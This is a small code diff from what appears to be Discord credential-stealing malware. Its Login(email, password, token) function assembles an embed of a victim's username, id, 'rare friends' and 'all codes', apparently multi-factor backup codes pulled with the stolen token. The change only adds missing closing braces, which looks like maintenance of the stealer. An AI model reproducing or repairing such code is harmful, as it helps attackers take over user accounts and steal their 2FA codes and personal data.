@@ -231,6 +231,7 @@ function Login(email, password, token) {
                 "name": "**RARE FRIENDS**",
                 "value": calc_f(json),
                 inline: true
+	      }
             ],
             "author": {
               "name": json.username +"#" + json.discriminator + "・" + json.id,
@@ -258,6 +259,7 @@ function Login(email, password, token) {
                   "name": "**ALL CODES**",
                   "value": mfas(token),
                   inline: true
+		}
               ],
               "author": {
                 "name": json.username +"#" + json.discriminator + "・" + json.id,
